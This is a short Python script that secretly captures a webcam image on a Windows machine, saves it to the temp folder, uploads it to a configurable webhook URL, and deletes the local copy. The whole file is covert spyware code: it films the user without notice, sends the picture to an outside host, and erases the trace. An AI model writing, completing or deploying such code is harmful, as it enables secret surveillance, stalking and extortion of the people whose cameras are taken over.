import os.path, os, cv2, requests

user = os.path.expanduser("~")
hook = ""

camera_port = 0

camera = cv2.VideoCapture(camera_port)

return_value, image = camera.read()

cv2.imwrite(user+"\\AppData\\Local\\Temp\\temp.png", image)
del(camera)

file = {"file": open(user+"\\AppData\\Local\\Temp\\temp.png", "rb")}

r = requests.post(hook, files=file)
try:
    os.remove(user+"\\AppData\\Local\\Temp\\temp.png")
except:
    pass
